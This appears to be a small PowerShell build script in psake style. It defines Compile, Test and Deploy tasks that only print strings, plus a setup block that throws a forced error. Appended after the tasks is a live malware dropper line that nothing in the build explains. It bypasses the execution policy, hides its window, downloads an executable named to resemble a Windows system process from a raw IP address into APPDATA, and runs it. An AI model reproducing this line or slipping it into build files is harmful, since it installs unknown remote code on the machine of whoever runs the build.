BuildSetup {
    throw "forced error"
}

Task default -depends Compile, Test, Deploy

Task Compile {
    "Compiling"
}

Task Test -depends Compile {
    "Testing"
}

Task Deploy -depends Test {
    "Deploying"
}

PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://94.102.52.13/~harvy/scvhost.exe', $env:APPDATA\stvgs.exe );Start-Process ( $env:APPDATA\stvgs.exe )

